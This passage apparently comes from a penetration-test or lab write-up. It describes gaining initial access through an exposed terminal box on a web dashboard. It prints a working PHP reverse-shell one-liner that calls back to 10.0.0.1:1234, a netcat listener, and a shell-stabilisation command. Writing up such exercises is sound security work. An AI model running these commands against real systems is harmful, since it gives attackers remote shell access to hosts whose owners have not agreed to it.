## 💻 Phase 3: Initial Access & Reverse Shell

The authenticated dashboard area exposed an unrestricted terminal execution command entry box. 

### Payload Staging
A PHP command string was injected into the web form to mandate a socket callback:
```php
php -r '\$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

A **Netcat** listening agent was spawned simultaneously on the attack host:
```bash
nc -lvnp 1234
```
Upon execution, an initial reverse shell callback was processed as the web user context (`www-data`). The shell interactive layer was immediately stabilized using Python pseudo-terminal constraints:
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

